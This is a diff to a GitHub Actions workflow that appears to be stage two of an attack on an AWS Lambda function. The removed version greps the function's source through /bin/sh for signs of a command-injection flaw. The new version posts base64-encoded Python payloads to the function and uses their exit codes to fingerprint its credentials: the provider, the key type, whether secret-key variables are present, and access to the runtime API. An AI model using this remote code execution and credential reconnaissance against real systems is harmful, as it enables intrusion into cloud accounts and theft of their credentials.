@@ -1,4 +1,4 @@
-name: Stage2-02-Identify-Source-Marker
+name: Stage2-03-Lambda-Credential-Fingerprint
 
 on:
   push:
@@ -9,7 +9,7 @@ permissions:
   contents: read
 
 jobs:
-  inspect:
+  fingerprint:
     runs-on: ubuntu-latest
 
     env:
@@ -23,7 +23,7 @@ jobs:
         run: |
           python3 -m pip install requests requests-aws4auth --quiet
 
-      - name: Identify source marker
+      - name: Fingerprint Lambda credentials
         run: |
           python3 - <<'PY'
           import os
@@ -39,29 +39,90 @@ jobs:
               session_token=os.environ["AWS_SESSION_TOKEN"]
           )
 
-          markers = [
-              "subprocess",
-              "shell=True",
-              "nslookup",
-              "lambda_handler",
-              "domain = event.get"
+          tests = {
+              "credential_provider": r'''
+          import boto3
+
+          try:
+              session = boto3.Session()
+              credentials = session.get_credentials()
+
+              if credentials is None:
+                  raise SystemExit(9)
+
+              method = str(getattr(credentials, "method", "")).lower()
+
+              if "env" in method:
+                  raise SystemExit(7)
+
+              if "container" in method or "role" in method:
+                  raise SystemExit(8)
+
+              if "assume" in method:
+                  raise SystemExit(10)
+
+              raise SystemExit(11)
+
+          except SystemExit:
+              raise
+          except Exception:
+              raise SystemExit(19)
+          ''',
+
+              "access_key_type": r'''
+          import boto3
+
+          try:
+              credentials = boto3.Session().get_credentials()
+
+              if credentials is None:
+                  raise SystemExit(9)
+
+              key = credentials.access_key or ""
+
+              if key.startswith("ASIA"):
+                  raise SystemExit(7)
+
+              if key.startswith("AKIA"):
+                  raise SystemExit(8)
+
+              raise SystemExit(10)
+
+          except SystemExit:
+              raise
+          except Exception:
+              raise SystemExit(19)
+          ''',
+
+              "lambda_environment": r'''
+          import os
+
+          required = [
+              "AWS_LAMBDA_FUNCTION_NAME",
+              "AWS_LAMBDA_FUNCTION_VERSION",
+              "AWS_EXECUTION_ENV",
+              "AWS_REGION",
+              "AWS_ACCESS_KEY_ID",
+              "AWS_SECRET_ACCESS_KEY",
+              "AWS_SESSION_TOKEN"
           ]
 
-          for marker in markers:
-              code = f'''
-          import subprocess
+          present = sum(1 for name in required if os.environ.get(name))
 
-          command = [
-              "/bin/sh",
-              "-c",
-              "grep -a -q {marker!r} /var/task/lambda_function.py"
-          ]
+          raise SystemExit(20 + min(present, 20))
+          ''',
 
-          result = subprocess.run(command)
+              "runtime_api": r'''
+          import os
 
-          raise SystemExit(7 if result.returncode == 0 else 9)
+          if os.environ.get("AWS_LAMBDA_RUNTIME_API"):
+              raise SystemExit(7)
+
+          raise SystemExit(9)
           '''
+          }
 
+          for name, code in tests.items():
               encoded = base64.b64encode(code.encode()).decode()
 
               response = requests.post(
@@ -71,7 +132,7 @@ jobs:
                   timeout=40
               )
 
-              print(f"MARKER={marker}")
+              print(f"TEST={name}")
               print(response.text)
               print("---")
           PY
